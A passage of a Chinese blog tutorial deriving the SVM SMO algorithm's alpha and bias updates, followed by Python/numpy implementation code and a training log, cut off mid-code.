<p>$s.t. \alpha_i &gt;=0,i=1,2,…n, \\<br>\sum\limits_{i=1}^n\alpha_iy_i=0$</p>
<h2 id="SMO内容"><a href="#SMO内容" class="headerlink" title="SMO内容"></a>SMO内容</h2><h3 id="alpha-的部分"><a href="#alpha-的部分" class="headerlink" title="$\alpha$的部分"></a>$\alpha$的部分</h3><p>将方程变形，乘以-1,变成一个最小的问题</p>
<p>$\mathop{min}\limits_{\alpha}\frac{1}{2}\sum\limits_{i=1}^{n}\sum\limits_{j=1}^n\alpha_i\alpha_jy_iy_jx_i^Tx_j -\sum\limits_{i=1}^n\alpha_i  $</p>
<p>$s.t. \alpha_i &gt;=0,i=1,2,…n, \\<br>\sum\limits_{i=1}^n\alpha_iy_i=0$</p>
<p>加入松弛变量C，保证可以有部分不是线性可分的，条件变为</p>
<p>$s.t. C&gt;= \alpha_i &gt;=0,i=1,2,…n, \\<br>\sum\limits_{i=1}^n\alpha_iy_i=0$</p>
<p>SMO为更新两个$\alpha$</p>
<p>则 $\alpha_1^{new}y_1 + \alpha_2^{new}y_2 = \alpha_1^{old}y_1 + \alpha_2^{old}y_2 = \zeta $</p>
<p>固定其他的值，只改变$\alpha_2^{new}的解$先确定它的上下限</p>
<p>$L&lt;=\alpha_2^{new}&lt;=H$</p>
<p>因为$C&gt;=\alpha&gt;=0$ 和$\alpha_1^{new}y_1 + \alpha_2^{new}y_2 = \alpha_1^{old}y_1 + \alpha_2^{old}y_2 = \zeta $</p>
<p>所以</p>
<p>当$y_1\ne y_2$时</p>
<p>$\alpha_1 - \alpha_2 = \zeta$</p>
<p>$\alpha_2 = \alpha_1 - \zeta$</p>
<p>得到</p>
<p>$C-\zeta&gt;=\alpha_2 &gt;= -\zeta$</p>
<p>结合$C&gt;=\alpha&gt;=0$,得到</p>
<p>$L=max(0,-\zeta),H=min(C,C-\zeta)$</p>
<p>同理，当$y_1=y_2$时，</p>
<p>$L=max(0,\zeta-C),H=min(C,\zeta)$</p>
<p>因此得到$\alpha_2^{new}$的上下界L和H为</p>
<p>$L=max(0,\alpha_2^{old}-\alpha_1^{old}),H=min(C,C+\alpha_2^{old} -\alpha_1^{old}),ify_1\ne y_2$</p>
<p>$L=max(0,\alpha_2^{old}+\alpha_1^{old}-C),H=min(C,\alpha_2^{old} +\alpha_1^{old}),ify_1= y_2$</p>
<p>固定除了$\alpha_1 \alpha_2的其他变量$</p>
<p>$w(\alpha_2) = \sum\limits_{i=1}^n\alpha_i - \frac{1}{2}\sum\limits_{i=1}^n\sum\limits_{i=1}^ny_iy_jx_i^Tx_j\alpha_i\alpha_j$</p>
<p>将$\alpha_1 \alpha_2$提出来得到</p>
<p>$w(\alpha_2) = \alpha_1 + \alpha_2 - \frac{1}{2}\alpha_1^2x_1^Tx_1 - \frac{1}{2}\alpha_2^2x_2^Tx_2 - y_1y_2\alpha_1\alpha_2x_1^Tx_2 - y_1\alpha_1v_1 - y_2\alpha_2v_2 + constant$ </p>
<p>其中</p>
<p>定义$f(x_i) = \sum\limits_{j=1}^n\alpha_jy_jx_i^Tx_j + b$</p>
<p>$v_i =\sum\limits_{j=3}^n\alpha_jy_jx_i^Tx_j  = f(x_i) -\sum\limits_{j=1}^2\alpha_jy_jx_i^Tx_j- b $</p>
<p>之后找到$\alpha_1和\alpha_2的关系$</p>
<p>因为$\sum\limits_{i=1}^n\alpha_iy_i=0$，所以将除了$\alpha_1y_1,\alpha_2y_2$的其他项看做常数-B</p>
<p>$\alpha_1y_1 + \alpha_2y_2 = B$，等式乘以$y_1$得到</p>
<p>$\alpha_1 = \gamma - s\alpha_2$ $，其中\gamma为By_1,s为y_1y_2$</p>
<p>带入公式，并且进行偏导</p>
<p>$\frac{\partial W(\alpha_2)}{\partial\alpha_2}=-s +1 +\gamma sx_1^Tx_1 - \alpha_2 x_1^Tx_1 - \alpha_2 x_2^Tx_2 - \gamma sx_1^Tx_2 + 2\alpha_2x_1^Tx_2 + y_2v_1 - y_2v_2 = 0$</p>
<p>导入$s=y_1y_2$得到</p>
<p>$\alpha_2^{new} = \frac{y_2(y_2-y_1+y_1\gamma(x_1^\intercal x_1 - x_1^\intercal x_2)+ v_1 -v_2)}{x_1^\intercal x_1 + x_2^\intercal x_2-2x_1^\intercal x_2}$</p>
<p>令$E_i = f(x_i)-y_i$</p>
<p>$\eta=x_1^Tx_1 + x_2^Tx_2 - 2x_1^Tx_2$</p>
<p>$E_i$为误差项，$\eta$为学习速率</p>
<p>已知$\gamma= \alpha_1^{old} + s\alpha_2^{old}$,和</p>
<p>$v_j=\sum\limits_{i=3}^n\alpha_iy_ix_j^Tx_i  = f(x_j) -\sum\limits_{i=1}^2\alpha_iy_ix_j^Tx_i- b $$</p>
<p>简化$\alpha_2^{new}$</p>
<p>$\alpha_2^{new}=\alpha_2^{old} +\frac{y_2(E_1-E_2)}{\eta}$</p>
<p>加上约束，最终得到的解为</p>
<p>$\alpha_2^{new,clipped}=\begin{cases}<br>H,&amp; \mbox{if }a_2^{new} &gt;H \\<br>a_2^{new},&amp; \mbox{if }L&lt;=a_2^{new}&lt;=H \\<br>L,&amp; \mbox{if }a_2^{new} &lt;L<br>\end{cases}$</p>
<p>又因为</p>
<p>$\alpha_1^{old}=\gamma -s\alpha_2^{old}$</p>
<p>$\alpha_1^{new} = \gamma -s\gamma_2^{new,clipped}$</p>
<p>消去$\gamma$得到</p>
<p>$\alpha_1^{new} = \alpha_1^{old} + y_1y_2(\alpha_2^{old} - \alpha_2^{new,clipped})$</p>
<h3 id="b的部分"><a href="#b的部分" class="headerlink" title="b的部分"></a>b的部分</h3><p>根据$y_1(w^Tx_1 + b)=1$两边乘以$y_1$，得到</p>
<p>$w^Tx_i+b =y_1$,又因为$w= \sum\limits_{i=1}^n\alpha_iy_ix_i$,得到</p>
<p>$\sum\limits_{i=1}^n\alpha_iy_ix_ix_1 +b=y1$单独提出$\alpha_1,alpha_2$，得</p>
<p>$b_1^{new} = y_1 -\sum\limits_{i=3}^n\alpha_iy_ix_i^Tx_1 - \alpha_1^{new}y_1x_1^Tx_1 - \alpha_2^{new}y_2x_2^Tx_1$</p>
<p>其中前两项为<br>$y_1 -\sum\limits_{i=3}^n\alpha_iy_ix_i^Tx_1=-E_1 + \alpha_1^{old}y_1x_1^Tx_1 + \alpha_2^{old}y_2x_2^Tx_1 + b^{old}$</p>
<p>整理得到</p>
<p>$b_1^{new}=b^{old} -E_1-y_1(\alpha_1^{new}- \alpha_1^{old})x_1^Tx_1 -y_2(\alpha_2^{new}-\alpha_2^{old})x_2^Tx_1$</p>
<p>同理得到$b_2^{new}$</p>
<p>$b_2^{new}=b^{old} -E_2-y_1(\alpha_1^{new}- \alpha_1^{old})x_1^Tx_2 -y_2(\alpha_2^{new}-\alpha_2^{old})x_2^Tx_2$</p>
<p>当$b_1,b_2都有效时，b^{new}=b_1^{new} = b_2^{new}$</p>
<p>所以，b的取值为</p>
<script type="math/tex; mode=display">b=\begin{cases}
b_1,& \mbox{if }0<\alpha_1^{new} <C \\
b_2,& \mbox{if }0<\alpha_2^{new} <C \\
\frac{b_1 + b_1}{2},& \mbox{otherwise}
\end{cases}</script><h3 id="SMO计算梳理"><a href="#SMO计算梳理" class="headerlink" title="SMO计算梳理"></a>SMO计算梳理</h3><ol>
<li>计算误差$E_i$</li>
</ol>
<p>$E_i=f(x_i) - y_i = \sum\limits_{j=1}^n\alpha_jy_jx_i^Tx_j +b -y_i$</p>
<ol>
<li>计算上下限</li>
</ol>
<script type="math/tex; mode=display">\begin{cases}
L=max(0,\alpha_2^{old}-\alpha_1^{old}),H=min(C,C+\alpha_2^{old} -\alpha_1^{old}),ify_1\ne y_2 \\
L=max(0,\alpha_2^{old}+\alpha_1^{old}-C),H=min(C,\alpha_2^{old} +\alpha_1^{old}),ify_1= y_2
\end{cases}</script><ol>
<li>计算$\eta$</li>
</ol>
<p>$\eta=x_1^Tx_1 + x_2^Tx_2 - 2x_1^Tx_2$</p>
<ol>
<li>更新$\alpha_j$</li>
</ol>
<p>$\alpha_j^{new}=\alpha_j^{old} +\frac{y_j(E_1-E_j)}{\eta}$</p>
<ol>
<li>根据取值范围修剪$\alpha_j$</li>
</ol>
<p>$\alpha_j^{new,clipped}=\begin{cases}<br>H,&amp; \mbox{if }a_j^{new} &gt;H \\<br>a_2^{new},&amp; \mbox{if }L&lt;=a_j^{new}&lt;=H \\<br>L,&amp; \mbox{if }a_j^{new} &lt;L<br>\end{cases}$</p>
<ol>
<li>更新$\alpha_i$</li>
</ol>
<p>$alpha_i^{new} = \alpha_i^{old} + y_jy_i(\alpha_j^{old} - \alpha_j^{new,clipped})$</p>
<ol>
<li>更新$b_i,b_j$</li>
</ol>
<p>$b_i^{new}=b^{old} -E_i-y_i(\alpha_i^{new}- \alpha_i^{old})x_i^Tx_i -y_j(\alpha_j^{new}-\alpha_j^{old})x_j^Tx_i$</p>
<p>$b_j^{new}=b^{old} -E_j-y_i(\alpha_i^{new}- \alpha_i^{old})x_i^Tx_j -y_j(\alpha_j^{new}-\alpha_j^{old})x_j^Tx_j$</p>
<ol>
<li>根据bi,bj更新b</li>
</ol>
<script type="math/tex; mode=display">b=\begin{cases}
b_i,& \mbox{if }0<\alpha_i^{new} <C \\
b_j,& \mbox{if }0<\alpha_j^{new} <C \\
\frac{b_i + b_j}{2},& \mbox{otherwise}
\end{cases}</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment">#SMO辅助函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadDataset</span><span class="params">(file_name)</span>:</span></span><br><span class="line">    <span class="string">"""读取文件，得到两个list，</span></span><br><span class="line"><span class="string">    data_mat 为2列m行，label_mat为m个元素"""</span></span><br><span class="line">    data_mat=[];label_mat=[]</span><br><span class="line">    fr = open(file_name)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fr.readlines():</span><br><span class="line">        line_arr = line.strip().split(<span class="string">'\t'</span>)</span><br><span class="line">        data_mat.append([float(line_arr[<span class="number">0</span>]),float(line_arr[<span class="number">1</span>])])</span><br><span class="line">        label_mat.append(float(line_arr[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">return</span> data_mat,label_mat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectJrand</span><span class="params">(i,m)</span>:</span></span><br><span class="line">    <span class="string">"""根据i，随机选取一个不是i的j"""</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    j = i</span><br><span class="line">    <span class="keyword">while</span>(j==i):</span><br><span class="line">        j = int(random.uniform(<span class="number">0</span>,m))</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clipAlpha</span><span class="params">(aj,H,L)</span>:</span></span><br><span class="line">    <span class="string">"""修剪alpha"""</span></span><br><span class="line">    <span class="keyword">if</span> aj &gt; H:</span><br><span class="line">        aj = H</span><br><span class="line">    <span class="keyword">elif</span> aj &lt; L:</span><br><span class="line">        aj = L</span><br><span class="line">    <span class="keyword">return</span> aj</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_arr,label_arr = loadDataset(<span class="string">'../../Downloads/machinelearninginaction/Ch06/testSet.txt'</span>)</span><br><span class="line">len(data_arr)</span><br></pre></td></tr></table></figure>
<pre><code>100
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set(label_arr)</span><br></pre></td></tr></table></figure>
<pre><code>{-1.0, 1.0}
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#流程为</span></span><br><span class="line"><span class="comment">#创建一个alpha向量，初始化为0</span></span><br><span class="line"><span class="comment">#当迭代次数小于最大迭代次数时(外循环)</span></span><br><span class="line"><span class="comment">#  对数据集的每一个数据向量(内循环)</span></span><br><span class="line"><span class="comment">#    如果该向量可以被优化:</span></span><br><span class="line"><span class="comment">#       随机选择另一个数据向量</span></span><br><span class="line"><span class="comment">#       同时优化这两个向量</span></span><br><span class="line"><span class="comment">#       如果两个向量都不能被优化，退出内循环</span></span><br><span class="line"><span class="comment">#  如果所有向量都没有被优化，增加迭代数目，继续下一次循环</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smo_simple</span><span class="params">(data_mat_in,class_labels,C,toler,max_iter)</span>:</span></span><br><span class="line">    <span class="string">"""数据集，数据标签，松弛常数，容错率，最大循环次数"""</span></span><br><span class="line">    data_matrix = np.mat(data_mat_in);label_mat =np.mat(class_labels).transpose()</span><br><span class="line">    b= <span class="number">0</span>;m,n = np.shape(data_matrix)</span><br><span class="line">    alphas = np.mat(np.zeros((m,<span class="number">1</span>)))</span><br><span class="line">    iter = <span class="number">0</span></span><br><span class="line">    <span class="comment">#外循环为总的循环数</span></span><br><span class="line">    <span class="keyword">while</span>(iter &lt; max_iter):</span><br><span class="line">        alpha_pairs_chanaged = <span class="number">0</span></span><br><span class="line">        <span class="comment">#内循环为每个求E_i,判断是否要优化，能优化则随机找一个j，进行优化，优化成功则改变alpha_pairs_changed，</span></span><br><span class="line">        <span class="comment">#一次内循环后，如果有改变则改iter为0，继续进行，如果最大循环次数中都没有改变则跳出外循环，得到结果</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">            <span class="comment">#1.求E_i</span></span><br><span class="line">            fx_i = float(np.multiply(alphas,label_mat).T * (data_matrix * data_matrix[i,:].T)) + b</span><br><span class="line">            e_i = fx_i - float(label_mat[i])</span><br><span class="line">            <span class="comment">#根据kkt标准</span></span><br><span class="line">            <span class="comment">#alpha=0时，y_ig(x_i) &gt;=1</span></span><br><span class="line">            <span class="comment">#0&lt;alpha&lt;C时，y_ig(x_i) = 1</span></span><br><span class="line">            <span class="comment">#alpha =C时，y_Ig(x_i) &lt;= 1</span></span><br><span class="line">            <span class="comment">#如果不符合其中的一条，则进行优化</span></span><br><span class="line">            <span class="keyword">if</span> ((label_mat[i] * e_i &lt; -toler) <span class="keyword">and</span> (alphas[i] &lt; C) <span class="keyword">or</span></span><br><span class="line">               ((label_mat[i] * e_i &gt; toler) <span class="keyword">and</span> (alphas[i] &gt; <span class="number">0</span>))):</span><br><span class="line">                j = selectJrand(i,m)</span><br><span class="line">                <span class="comment">#求出了f(x_j)</span></span><br><span class="line">                fx_j = float(np.multiply(alphas,label_mat).T * (data_matrix * data_matrix[j,:].T)) + b</span><br><span class="line">                <span class="comment">#fx_j = float(np.multiply(alphas,label_mat).T) * (data_matrix[j,:] * data_matrix.T).T + b #为原本方程的顺序</span></span><br><span class="line">                e_j = fx_j - float(label_mat[j]) <span class="comment">#得到E_j</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment">#2.求上下限</span></span><br><span class="line">                alpha_i_old = alphas[i].copy()</span><br><span class="line">                alpha_j_old = alphas[j].copy()</span><br><span class="line">                <span class="keyword">if</span> (label_mat[i] != label_mat[j]):</span><br><span class="line">                    L = max(<span class="number">0</span>,alphas[j] - alphas[i])</span><br><span class="line">                    H = min(C,C+ alphas[j] - alphas[i])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    L = max(<span class="number">0</span>,alphas[j] + alphas[i] - C)</span><br><span class="line">                    H = min(C, alphas[j] + alphas[i])</span><br><span class="line">                <span class="keyword">if</span> L==H: <span class="comment">#上下限相等，C为0，或者都为C，或者一个为C，一个为0；C为0时，则alpha都是0，不成立；都为C时，没法增大也没法变小，一个为C，一个为0时，即alpha_i为C，并不会改变，还是C</span></span><br><span class="line">                    <span class="comment">#print('L==H')</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#eta与原本的符号相反</span></span><br><span class="line">                eta = <span class="number">2.0</span> * data_matrix[i,:] * data_matrix[j,:].T - data_matrix[i,:] * data_matrix[i,:].T - data_matrix[j,:] * data_matrix[j,:].T</span><br><span class="line">                <span class="keyword">if</span> eta &gt;= <span class="number">0</span>: <span class="comment">#变化率为负数，并不符合，eta应为正数</span></span><br><span class="line">                    <span class="comment">#print('eta &gt;=0')</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#原本的加上，现在为减去</span></span><br><span class="line">                alphas[j] -= label_mat[j] *(e_i - e_j)/eta</span><br><span class="line">                alphas[j] = clipAlpha(alphas[j],H,L)</span><br><span class="line">                <span class="keyword">if</span> (abs(alphas[j] - alpha_j_old) &lt;<span class="number">0.00001</span>):</span><br><span class="line">                    <span class="comment">#print('j not moving enough') #变化太小，跳出本次循环，换其他j</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                alphas[i] += label_mat[i]*label_mat[j] *(alpha_j_old - alphas[j])</span><br><span class="line">                </span><br><span class="line">                b_1 = b - e_i - label_mat[i] * (alphas[i] - alpha_i_old) * data_matrix[i,:] * data_matrix[i,:].T -  label_mat[j] * (alphas[j] - alpha_j_old)* data_matrix[i,:] * data_matrix[j,:].T</span><br><span class="line">                </span><br><span class="line">                b_2 = b - e_j - label_mat[i] * (alphas[i] -alpha_i_old) * data_matrix[i,:] * data_matrix[j,:].T - label_mat[j] * (alphas[j] - alpha_j_old) * data_matrix[j,:] * data_matrix[j,:].T</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> &lt;alphas[i]) <span class="keyword">and</span> (C &gt; alphas[i]): </span><br><span class="line">                    b = b_1</span><br><span class="line">                <span class="keyword">elif</span> (<span class="number">0</span> &lt; alphas[j]) <span class="keyword">and</span> (C &gt; alphas[j]):</span><br><span class="line">                    b = b_2</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    b = (b_1 + b_2) /<span class="number">2.0</span></span><br><span class="line">                alpha_pairs_chanaged += <span class="number">1</span></span><br><span class="line">                <span class="comment">#print('iter: %d i:%d,pairs changed %d'%(iter,i,alpha_pairs_chanaged))</span></span><br><span class="line">                <span class="comment">#print('alpha_i_old: %f, alpha_i_new: %f,alpha_j_old: %f, alpha_j_new: %f' %(alpha_i_old,alphas[i],alpha_j_old,alphas[j]))</span></span><br><span class="line">        print(<span class="string">"fullSet, iter: %d , pairs changed %d"</span> % (iter,alpha_pairs_chanaged))</span><br><span class="line">        <span class="keyword">if</span> (alpha_pairs_chanaged == <span class="number">0</span>):</span><br><span class="line">            iter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            iter =<span class="number">0</span></span><br><span class="line">        print(<span class="string">'iteration number: %d'</span> % iter)</span><br><span class="line">    <span class="keyword">return</span> b,alphas</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b,alphas = smo_simple(data_arr,label_arr,<span class="number">0.6</span>,<span class="number">0.001</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 7
iteration number: 0
fullSet, iter: 0 , pairs changed 4
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 6
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 2
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 0
iteration number: 5
fullSet, iter: 5 , pairs changed 0
iteration number: 6
fullSet, iter: 6 , pairs changed 0
iteration number: 7
fullSet, iter: 7 , pairs changed 1
iteration number: 0
fullSet, iter: 0 , pairs changed 0
iteration number: 1
fullSet, iter: 1 , pairs changed 0
iteration number: 2
fullSet, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 0
iteration number: 5
fullSet, iter: 5 , pairs changed 0
iteration number: 6
fullSet, iter: 6 , pairs changed 0
iteration number: 7
fullSet, iter: 7 , pairs changed 0
iteration number: 8
fullSet, iter: 8 , pairs changed 0
iteration number: 9
fullSet, iter: 9 , pairs changed 0
iteration number: 10
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#边界上的样本对应的α_i=0或者α_i=C，在优化过程中很难变化，然而非边界样本0&lt;α_i&lt;C会随着对其他变量的优化会有大的变化</span></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">optStruct</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,dataMatIn, classLabels, C, toler)</span>:</span>  <span class="comment"># Initialize the structure with the parameters </span></span><br><span class="line">        self.X = dataMatIn</span><br><span class="line">        self.labelMat = classLabels</span><br><span class="line">        self.C = C</span><br><span class="line">        self.tol = toler</span><br><span class="line">        self.m = shape(dataMatIn)[<span class="number">0</span>]</span><br><span class="line">        self.alphas = mat(zeros((self.m,<span class="number">1</span>)))</span><br><span class="line">        self.b = <span class="number">0</span></span><br><span class="line">        self.eCache = mat(zeros((self.m,<span class="number">2</span>))) <span class="comment">#第一项储存是否有效</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcEk</span><span class="params">(oS, k)</span>:</span></span><br><span class="line">    fXk = float(multiply(oS.alphas,oS.labelMat).T*(oS.X*oS.X[k,:].T)) + oS.b</span><br><span class="line">    Ek = fXk - float(oS.labelMat[k])</span><br><span class="line">    <span class="keyword">return</span> Ek</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectJ</span><span 